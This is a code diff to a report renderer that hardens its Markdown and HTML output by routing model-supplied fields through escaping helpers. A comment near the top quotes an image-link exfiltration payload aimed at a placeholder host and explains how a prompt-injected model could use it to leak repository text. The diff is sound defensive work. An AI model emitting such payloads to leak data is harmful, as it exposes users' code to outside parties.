@@ -9,14 +9,14 @@ on surprises, amber "on purpose" badges on absences.
 import html as _html
 import os
 
+from crawl.core.render import markdown_parser, md_cell, md_heading, md_line, md_quote
+
 from markdown_it import MarkdownIt
 
 # coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
 # live <img> that fires on page open, an egress channel from repo text via
 # a prompt-injected model. html=False does not cover it.
-_MD = MarkdownIt(
-    "commonmark", {"html": False, "linkify": True, "breaks": False}
-).enable(["table"]).disable("image")
+_MD = markdown_parser()
 
 
 def md(text):
@@ -455,7 +455,7 @@ def render_html(name, shared):
     present_items = "\n".join(
         f'        <li>'
         f'<div class="head"><span class="num">{i+1}</span>'
-        f'<div class="headline">{md(p["headline"])}</div></div>'
+        f'<div class="headline">{md(md_heading(p["headline"]))}</div></div>'
         f'<div class="where">{md(p["where"])}</div>'
         f'<div class="body">{md(p["bet"])}</div>'
         f'</li>'
@@ -464,7 +464,7 @@ def render_html(name, shared):
     absent_items = "\n".join(
         f'        <li>'
         f'<div class="head"><span class="num">{i+1}</span>'
-        f'<div class="headline">{md(a["headline"])}</div></div>'
+        f'<div class="headline">{md(md_heading(a["headline"]))}</div></div>'
         f'<div class="where">{md(a["evidence"])}</div>'
         f'<div class="body">{md(a["tradeoff"])}</div>'
         f'</li>'
@@ -497,19 +497,19 @@ def render_markdown(name, shared):
     parts.append("_A product story reverse engineered from the codebase._\n")
 
     parts.append("## The pitch\n")
-    parts.append(f"> {shared['variant']}\n")
+    parts.append(md_quote(shared['variant']) + "\n")
 
     parts.append("## The pain\n")
-    parts.append(f"> {shared['pain']}\n")
+    parts.append(md_quote(shared['pain']) + "\n")
 
     parts.append("## Where it sits\n")
     parts.append("### What it gives up\n")
     for s in positioning.get("sacrifices", []):
-        parts.append(f"- {s}")
+        parts.append(f"- {md_line(s)}")
     parts.append("")
     parts.append("### What it gets in return\n")
     for g in positioning.get("gains", []):
-        parts.append(f"- {g}")
+        parts.append(f"- {md_line(g)}")
     parts.append("")
     parts.append("### Why incumbents can't copy this\n")
     parts.append(positioning.get("why_incumbents_cannot_copy", "").strip() + "\n")
@@ -521,21 +521,19 @@ def render_markdown(name, shared):
     for d in positioning["dimensions"]:
         parts.append(f"- **{d['name']}**: {d['definition']}")
     parts.append("")
-    headers = ["Product"] + [d["name"] for d in positioning["dimensions"]]
+    headers = ["Product"] + [md_cell(d["name"]) for d in positioning["dimensions"]]
     parts.append("| " + " | ".join(headers) + " |")
     parts.append("| " + " | ".join(["---"] * len(headers)) + " |")
     for c in positioning["competitors"]:
-        cells = [f"**{c['name']}**"]
+        cells = [f"**{md_cell(c['name'])}**"]
         for cell in c.get("cells", []):
-            verdict = str(cell.get("verdict", "")).replace("\n", " ")
-            detail = str(cell.get("detail", "")).replace("\n", " ")
-            cells.append(f"**{verdict}**. {detail}")
+            cells.append(f"**{md_cell(cell.get('verdict', ''))}**. {md_cell(cell.get('detail', ''))}")
         parts.append("| " + " | ".join(cells) + " |")
     parts.append("")
 
     parts.append("## Hiding in the code\n")
     for p in surprises["present"]:
-        parts.append(f"### {p['headline']}")
+        parts.append(f"### {md_heading(p['headline'])}")
         parts.append(f"_{p['where']}_")
         parts.append("")
         parts.append(p["bet"])
@@ -543,7 +541,7 @@ def render_markdown(name, shared):
 
     parts.append("## Missing on purpose\n")
     for a in surprises["absent"]:
-        parts.append(f"### {a['headline']}")
+        parts.append(f"### {md_heading(a['headline'])}")
         parts.append(f"_{a['evidence']}_")
         parts.append("")
         parts.append(a["tradeoff"])
